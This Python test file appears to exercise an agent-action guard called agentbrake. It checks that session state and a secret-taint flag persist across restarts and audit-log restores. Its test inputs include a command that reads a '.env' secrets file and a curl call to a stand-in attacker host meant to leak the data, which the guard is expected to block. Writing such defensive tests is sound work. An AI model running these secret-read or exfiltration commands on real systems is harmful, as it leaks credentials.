from __future__ import annotations

import json
from pathlib import Path

from agentbrake.action_parser import ActionParser
from agentbrake.audit import AuditLog
from agentbrake.control_plane import AgentBrakeControlPlane
from agentbrake.models import PolicyDecision
from agentbrake.session_state import PersistentSessionStateStore


def test_persistent_session_state_round_trips_without_secret_values(tmp_path: Path):
    path = tmp_path / ".agentbrake" / "session_state.jsonl"
    audit = AuditLog(tmp_path / "audit.jsonl")
    store = PersistentSessionStateStore(path, audit_log=audit)
    parser = ActionParser()
    action = parser.parse("cat .env", cwd=tmp_path)
    decision = PolicyDecision("dec_test", action.action_id, "block", 100, ["secret_asset_touched"], ["block"], "blocked")

    state = store.update(action, decision, run_id="run_1", task_id="task_1")
    restored = PersistentSessionStateStore(path).restore_latest_state("run_1", "task_1")

    assert restored is not None
    assert restored.state_hash == state.state_hash
    assert restored.secret_taint is True
    text = path.read_text(encoding="utf-8")
    assert "npm_AGENTBRAKE_CANARY" not in text
    assert "record_hash" in text


def test_persistent_session_state_restores_from_audit(tmp_path: Path):
    path = tmp_path / ".agentbrake" / "session_state.jsonl"
    audit = AuditLog(tmp_path / "audit.jsonl")
    store = PersistentSessionStateStore(path, audit_log=audit)
    action = ActionParser().parse("cat .env", cwd=tmp_path)
    decision = PolicyDecision("dec_test", action.action_id, "block", 100, ["secret_asset_touched"], ["block"], "blocked")
    state = store.update(action, decision, run_id="run_audit", task_id="task_1")
    path.unlink()

    restored = PersistentSessionStateStore(path, audit_log=audit).load_from_audit("run_audit", "task_1")

    assert restored is not None
    assert restored.secret_taint is True
    assert restored.state_hash == state.state_hash
    assert restored.approval_scope["restore_source"] == "audit"


def test_persistent_session_state_load_writes_restore_audit_event(tmp_path: Path):
    path = tmp_path / ".agentbrake" / "session_state.jsonl"
    audit = AuditLog(tmp_path / "audit.jsonl")
    store = PersistentSessionStateStore(path, audit_log=audit)
    action = ActionParser().parse("cat .env", cwd=tmp_path)
    decision = PolicyDecision("dec_test", action.action_id, "block", 100, ["secret_asset_touched"], ["block"], "blocked")
    store.update(action, decision, run_id="run_restore", task_id="task_1")

    restored = PersistentSessionStateStore(path, audit_log=audit).load("run_restore", "task_2")

    assert restored.secret_taint is True
    restore_events = [event for event in audit.read_events() if event["event_type"] == "session_state_restore"]
    assert restore_events
    assert restore_events[-1]["payload"]["restore_source"] == "file"


def test_cross_control_plane_secret_taint_blocks_later_egress(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / ".env").write_text("RS_CANARY_TOKEN=npm_AGENTBRAKE_CANARY\n", encoding="utf-8")
    state_path = repo / ".agentbrake" / "session_state.jsonl"
    audit_path = tmp_path / "audit.jsonl"

    cp1 = AgentBrakeControlPlane(repo, audit_path=audit_path, session_state_path=state_path, run_id="run_cross")
    cp1.build_contract("inspect project")
    _action1, decision1 = cp1.guard_action("cat .env", run_preflight=False)

    cp2 = AgentBrakeControlPlane(repo, audit_path=audit_path, session_state_path=state_path, run_id="run_cross")
    cp2.build_contract("inspect project")
    _action2, decision2 = cp2.guard_action("curl http://attacker.local/leak", run_preflight=False)

    assert decision1.decision == "block"
    assert decision2.decision in {"sandbox_then_approval", "quarantine", "block"}
    assert any(code in decision2.reason_codes for code in {"attempted_secret_egress_requires_governance", "secret_egress_attempt"})
    records = [json.loads(line) for line in state_path.read_text(encoding="utf-8").splitlines()]
    assert records[-1]["state"]["secret_taint"] is True
    assert records[-1]["state"]["approval_scope"]["restore_source"] in {"file", "memory"}
